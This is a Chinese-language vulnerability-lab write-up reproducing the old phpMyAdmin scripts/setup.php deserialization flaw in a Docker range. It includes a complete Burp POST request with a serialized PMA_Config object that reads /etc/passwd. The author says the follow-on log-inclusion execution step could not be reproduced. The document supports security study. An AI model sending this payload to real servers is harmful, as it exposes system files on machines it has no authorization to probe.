ailx10说：这篇是我2023年10月写的。我原本只打算用旧 phpMyAdmin 的 setup.php 做个文件读取，读到系统文件以后，又看到有人把日志包含接成执行，于是忍不住跟着往下试。思路是先让日志留下内容，再把日志作为文件读进来，可我的环境没有得到预期记录，后半段就没有复现成功。所以这篇既记了已经看到的读取结果，也把没完成的尝试留下来。能读文件和能让它当代码执行，中间还有条件，不能因为别人的链路跑通，就把自己的空白补成成功。

以下为历史靶场记录，地址和命令仅作解释；实验未重新执行，测试应使用明确授权的隔离环境。

phpMyAdmin 是 Web 数据库管理工具。原实验尝试旧版本反序列化相关文件读取，另引用日志包含的执行思路；后者并未在该环境复现。

前提：准备好docker环境，下载好书籍配套实验环境，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

实验结束后可在确认项目目录和 Compose 配置后关闭该项目的服务；原文的全局 Docker 清理命令已移除。

简单访问一下，说明phpMyAdmin scripts:setup.php 反序列化漏洞（WooYun-2016-199433）环境搭建成功了

![](/notes-assets/d690468b4a1b93d6e0d8.webp)

掏出burpsuite准备发一个POST请求，获取etc目录下的passwd文件内容

```
POST /scripts/setup.php HTTP/1.1

Host: 144.34.162.13:8080

Accept-Encoding: gzip, deflate

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 80



action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
```

![](/notes-assets/a286caa3ae43f73e4b57.webp)

原作者称实验环境没有记录所需请求，因此没有完成日志包含或命令执行。读取文件与将文件作为代码执行是不同能力。

![](/notes-assets/c8c57b27f1e51981ea33.webp)

原环境里日志那一步没能复现，就保留为未走通的分支。这样文件读取的结果仍然清楚，后面也有具体方向可查，不必拿一段假想成功补齐文章。
